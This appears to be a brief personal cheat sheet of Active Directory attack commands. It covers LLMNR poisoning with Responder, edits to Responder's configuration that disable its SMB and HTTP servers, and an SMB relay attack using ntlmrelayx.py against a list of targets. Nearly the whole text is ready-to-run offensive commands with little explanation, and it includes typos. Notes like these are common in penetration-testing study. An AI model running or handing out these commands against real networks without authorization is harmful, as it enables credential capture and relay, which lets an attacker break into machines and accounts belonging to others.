# ADAttacking

## LLMNR poisioning

```
python3 responder -I tun0 -rdwv
```

Edit responder. 

```
sudo nano /usr/share/responder.conf
```
---
## SMB Relay Attack (Respoonder)

```
python3 responder -I tun0 -rdwv
```

Edit responder. 

```
sudo nano /usr/share/responder.conf
# SMB OFF
# HTTP OFF
```

NTLMRelay

```
ntlmrelayx.py -tf targets.txt -smb2support
```
---
